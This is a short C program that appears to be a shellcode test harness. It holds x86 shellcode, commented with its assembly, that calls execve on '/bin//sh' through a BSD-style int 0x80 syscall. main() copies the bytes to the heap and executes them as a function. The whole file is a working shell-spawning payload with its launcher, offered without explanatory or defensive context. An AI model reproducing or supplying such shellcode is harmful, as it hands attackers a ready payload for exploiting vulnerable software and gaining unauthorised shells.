

#include <stdio.h> 
#include <stdlib.h> 
#include <string.h>



char shellcode[]=   "\x31\xC0"      // xor eax,eax
      "\x50"        // push eax
            "\x68\x2F\x2F\x73\x68"    // push dword
                  "\x68\x2F\x62\x69\x6E"    // push dword 
                        "\x89\xE3"      // mov ebx,esp
                              "\x50\x50\x53"      // push eax, push eax, push ebx
                                    "\xB0\x3B"      // mov al,0x3b
                                          "\x6A\x2A"      // push byte 0x2a
                                                "\xCD\x80";      // int 0x80


                                                int main(int argc, char *argv[]){
                                                  void (*f)(); 
                                                  char *x = malloc(sizeof(shellcode));
                                                  memcpy(x, shellcode, sizeof(shellcode));
                                                  f = (void (*)()) x;
                                                  f();
                                                }
